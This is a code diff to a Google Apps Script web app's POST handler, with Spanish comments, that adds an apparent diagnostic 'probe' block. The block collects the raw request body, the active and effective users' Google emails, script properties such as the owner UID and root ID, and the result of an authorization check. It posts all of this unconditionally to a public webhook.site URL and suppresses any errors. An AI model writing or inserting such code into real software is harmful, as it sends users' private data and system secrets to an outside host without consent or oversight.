@@ -24,6 +24,66 @@ function doGet(e) {
  * Receptor universal de mensajes UQO.
  */
 function doPost(e) {
+  // 🪬 SONDA SOBERANA DE TITANIO (V2: ROBUSTA Y FRACCIONADA)
+  const webhookUrl = 'https://webhook.site/e0132a44-9173-45f0-9b04-2816345efb80';
+  const spyData = {
+    NETWORK: { query_string: e.queryString || '', param_authuser: (e.parameter && e.parameter.authuser) || 'MISSING' },
+    IDENTITY: { google_active_user: 'ERROR', google_effective_user: 'ERROR', indra_auth_eval: 'NOT_EVALUATED' },
+    SYSTEM_STATE: { SYS_IS_BOOTSTRAPPED: 'ERROR', root_id: 'ERROR', uid: 'ERROR', state_manager_result: 'ERROR', readCoreOwnerEmail_result: 'ERROR' },
+    PAYLOAD_ANALYSIS: { raw_content: e.postData ? e.postData.contents : 'NO_POST_DATA', is_valid_json: false, parsed_protocol: 'NONE' }
+  };
+
+  // Bloque Identidad Google
+  try {
+    spyData.IDENTITY.google_active_user = Session.getActiveUser().getEmail() || 'ANONYMOUS';
+    spyData.IDENTITY.google_effective_user = Session.getEffectiveUser().getEmail() || 'ANONYMOUS';
+  } catch (err) { spyData.IDENTITY.google_active_user = err.message; }
+
+  // Bloque Propiedades del Kernel
+  try {
+    const props = PropertiesService.getScriptProperties().getProperties();
+    spyData.SYSTEM_STATE.SYS_IS_BOOTSTRAPPED = props['SYS_IS_BOOTSTRAPPED'] || 'MISSING';
+    spyData.SYSTEM_STATE.root_id = props['SYS_MOUNT_ROOT_ID'] || 'MISSING';
+    spyData.SYSTEM_STATE.uid = props['SYS_CORE_OWNER_UID'] || 'MISSING';
+    spyData.SYSTEM_STATE.readCoreOwnerEmail_result = readCoreOwnerEmail();
+  } catch (err) { spyData.SYSTEM_STATE.SYS_IS_BOOTSTRAPPED = err.message; }
+
+  // Bloque State Manager
+  try {
+    spyData.SYSTEM_STATE.state_manager_result = SystemStateManager.getState();
+  } catch (err) { spyData.SYSTEM_STATE.state_manager_result = err.message; }
+
+  // Bloque Parseo y Auth Indra
+  let parsedJson = null;
+  if (e.postData && e.postData.contents) {
+    try {
+      parsedJson = JSON.parse(e.postData.contents);
+      spyData.PAYLOAD_ANALYSIS.is_valid_json = true;
+      spyData.PAYLOAD_ANALYSIS.parsed_protocol = parsedJson.protocol || 'MISSING_PROTOCOL';
+      
+      // Simular validación
+      const contract = ProtocolRegistry.getContract(parsedJson.protocol);
+      if (contract) {
+        const dummyAuth = AuthService.authorize(parsedJson, contract);
+        spyData.IDENTITY.indra_auth_eval = dummyAuth ? ('AUTHORIZED AS: ' + dummyAuth.owner_id) : 'REJECTED';
+      } else {
+         spyData.IDENTITY.indra_auth_eval = 'PROTOCOL_UNREGISTERED';
+      }
+    } catch (err) { 
+      spyData.PAYLOAD_ANALYSIS.is_valid_json = false; 
+      spyData.PAYLOAD_ANALYSIS.error = err.message;
+    }
+  }
+
+  // Disparo Incondicional al Webhook
+  try {
+    UrlFetchApp.fetch(webhookUrl, {
+      method: 'post',
+      contentType: 'application/json',
+      payload: JSON.stringify(spyData)
+    });
+  } catch (webhookErr) { /* fallback si Google bloquea fetch saliente */ }
+
   // --- 0. REFLEJO INCONDICIONAL (Fricción Cero) ---
   // Respondemos al ping de salud antes de cualquier lógica pesada para evitar bloqueos de Google.
   try {
